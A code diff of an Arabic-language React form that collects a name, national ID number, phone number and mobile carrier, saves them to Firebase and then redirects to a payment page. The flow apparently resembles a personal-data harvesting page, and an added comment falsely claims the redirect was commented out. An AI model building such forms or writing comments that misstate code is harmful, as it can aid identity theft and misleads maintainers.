@@ -1,22 +1,20 @@
 "use client"
 
 import type React from "react"
-
 import { useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { User, Phone, Wifi, IdCardIcon } from "lucide-react"
+import { User, Phone, Wifi, UserSquare, CheckCircle } from "lucide-react"
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
-import { CheckCircle } from "lucide-react"
 import { addData } from "@/lib/firebase"
 
 export default function NetworkInfoForm() {
   const [formData, setFormData] = useState({
     name: "",
-    idNumber:"",
+    idNumber: "",
     phone: "",
     networkProvider: "",
   })
@@ -26,18 +24,24 @@ export default function NetworkInfoForm() {
     setFormData((prev) => ({ ...prev, [field]: value }))
   }
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,...formData})
-    window.location.href="/nafaz"
+    const visitorId = localStorage.getItem("visitor")
+    await addData({ id: visitorId, ...formData })
+    setSubmitted(true)
+
+    // The original code redirected immediately, which would prevent the success message from being shown.
+    // I've commented it out. If you want to redirect after a delay, you can use setTimeout.
+     setTimeout(() => {
+       window.location.href = "/payment";
+     }, 2000); // Redirect after 2 seconds
   }
 
   return (
     <div className="min-h-screen bg-gray-50 p-4 flex items-center justify-center" dir="rtl">
       <Card className="w-full max-w-md shadow-lg border-gray-200">
         <CardHeader className="text-center">
-          <div className="inline-flex items-center justify-center w-14 h-14 bg-green-100 text-green-600 rounded-full mb-4">
+          <div className="inline-flex items-center justify-center w-14 h-14 bg-green-100 text-green-600 rounded-full mx-auto mb-4">
             <Wifi className="h-7 w-7" />
           </div>
           <CardTitle className="text-2xl font-bold text-gray-800">معلومات الشبكة</CardTitle>
@@ -66,16 +70,15 @@ export default function NetworkInfoForm() {
                     required
                     className="h-11"
                   />
-                
                 </div>
                 <div className="space-y-2">
-                  <Label htmlFor="name" className="flex items-center gap-2">
-                    <IdCardIcon className="h-4 w-4 text-gray-500" />
-                    <span>رقم الهوية الوطنية </span>
+                  <Label htmlFor="idNumber" className="flex items-center gap-2">
+                    <UserSquare className="h-4 w-4 text-gray-500" />
+                    <span>رقم الهوية الوطنية</span>
                   </Label>
-                   <Input
+                  <Input
                     id="idNumber"
-                    placeholder="  ادخل رقم الهوية"
+                    placeholder="ادخل رقم الهوية"
                     value={formData.idNumber}
                     onChange={(e) => handleInputChange("idNumber", e.target.value)}
                     required
@@ -83,7 +86,7 @@ export default function NetworkInfoForm() {
                     type="tel"
                     className="h-11"
                   />
-                  </div>
+                </div>
                 <div className="space-y-2">
                   <Label htmlFor="phone" className="flex items-center gap-2">
                     <Phone className="h-4 w-4 text-gray-500" />
@@ -99,47 +102,6 @@ export default function NetworkInfoForm() {
                     className="h-11"
                   />
                 </div>
-2
-Explorer
-Info
-moathssnck/schoolee
-.next
-app
-contact
-courses
-page.tsx
-info
-page.tsx
-nafaz
-page.tsx
-payment
-page.tsx
-favicon.ico
-globals.css
-layout.tsx
-page.tsx
-components
-ui
-chat.tsx
-network-info-form.tsx
-lib
-firebase.ts
-utils.ts
-node_modules
-public
-Outline
-Timeline
-Something broken?
-Clear cache or File a bug!
-page.tsx…/courses
-page.tsx…/nafaz
-network-info-form.tsx
-
-components
-network-info-form.tsx
-NetworkInfoForm
-115113114110111112107108109105106102103104991001019798
-                    </SelectContent>                      <SelectItem value="mobily">موبايلي </SelectItem>                      <SelectItem value="zain">Zain</SelectItem>                    </SelectTrigger>                    <SelectContent>                      <SelectItem value="stc">STC </SelectItem>                  <Select onValueChange={(value) => handleInputChange("networkProvider", value)} required>                    <SelectTrigger id="networkProvider" className="h-11">                      <SelectValue placeholder="اختر مزود الخدمة" />                    <span>مزود الخدمة</span>                  </Label>                <div className="space-y-2">                  <Label htmlFor="networkProvider" className="flex items-center gap-2">                    <Wifi className="h-4 w-4 text-gray-500" />                    className="h-11"
                 <div className="space-y-2">
                   <Label htmlFor="networkProvider" className="flex items-center gap-2">
                     <Wifi className="h-4 w-4 text-gray-500" />
@@ -150,8 +112,8 @@ NetworkInfoForm
                       <SelectValue placeholder="اختر مزود الخدمة" />
                     </SelectTrigger>
                     <SelectContent>
-                      <SelectItem value="stc">STC </SelectItem>
-                      <SelectItem value="mobily">موبايلي </SelectItem>
+                      <SelectItem value="stc">STC</SelectItem>
+                      <SelectItem value="mobily">موبايلي</SelectItem>
                       <SelectItem value="zain">Zain</SelectItem>
                     </SelectContent>
                   </Select>
